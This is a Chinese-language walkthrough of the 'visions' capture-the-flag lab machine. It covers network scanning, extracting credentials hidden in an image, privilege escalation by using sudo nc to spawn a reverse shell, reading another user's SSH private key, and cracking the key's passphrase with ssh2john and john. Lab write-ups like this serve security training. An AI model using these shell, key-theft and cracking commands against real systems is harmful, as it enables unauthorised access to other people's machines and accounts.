|   |   |   |
|---|---|---|
|visions|easy|图片隐写、图片调试、exiftool使用、sudo-nc提权、ssh私钥提权、ssh2john使用、john爆破私钥、ssh 私钥利用|
# 主机发现
```C
sudo netdiscover -i eth0 -r 192.168.44.136/24
```
# 服务扫描
```C
sudo nmap -sV -A -T 4 -p- 192.168.44.136 
```
# 目录扫描

右键检查查看源码，猜测是用户名alicia
```C
 http://192.168.44.136/index.html
 
Only those that can see the invisible can do the imposible.
You have to be able to see what doesnt exist.
Only those that can see the invisible being able to see whats not there.
-alicia 

翻译

只有那些能看到无形事物的人才能做到不可能的事情。
你必须能够看到不存在的东西。
只有那些能够看到不可见事物的人才能看到不存在的事物。
-艾丽西亚
```

页面只有个white.png空白图片，猜测是图片隐写
保存下来
查看信息
```C
exiftool white.png
strings white.png

得到： pw:ihaveadream
```
# 提权



```C
┌──(kali㉿kali)-[~/下载]
└─$ ssh alicia@192.168.44.136 //ihaveadream

sudo -l //  (emma) NOPASSWD: /usr/bin/nc
sudo -u emma /usr/bin/nc -e /bin/bash 192.168.44.136 2333
```

新建一个控制台ssh连接，nc监听
```C
nc -lvnp 2333

python3 -c 'import pty;pty.spawn("/bin/bash")'

emma@visions:~$ cat note.txt
cat note.txt
I cant help myself.
emma@visions:/home$ ls
ls
alicia  emma  isabella  sophia
emma@visions:/home$ cd sophia
cd sophia
emma@visions:/home/sophia$ ls
ls
flag.sh  user.txt
emma@visions:/home/sophia$ cat user.txt
cat user.txt
cat: user.txt: Permission denied

```
可以看到home目录下还有好多其他用户，这里脑洞较为大，还得回到那张图片white.png
把它复制到windows的world里，图片格式-->矫正-->图片矫正选项-->对比度-56%，就能看到账户密码

>sophia/seemstobeimpossible

获得第一个flag
```C
emma@visions:/home/sophia$ su sophia
su sophia
Password: seemstobeimpossible

sophia@visions:~$ cat user.txt
cat user.txt
hmvicanseeforever

```

读取到ssh私钥
```c
sudo -l ///usr/bin/cat /home/isabella/.invisible
sudo /usr/bin/cat /home/isabella/.invisible
```

将私钥复制出来编辑到id_rsa，这登录还需要密码，我们使用 **ssh2john** 将 **id_isa** 秘钥信息 转换 为 **john** 可以识别的hash，然后进行爆破,得到密码是invisible
```C
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ vim id_rsa
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ ssh2john id_rsa >> hash  
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

0g 0:00:05:24 0.06% (ETA: 2024-04-23 18:54) 0g/s 33.41p/s 33.41c/s 33.41C/s pink69..findingnemo
invisible        (id_rsa)   
```

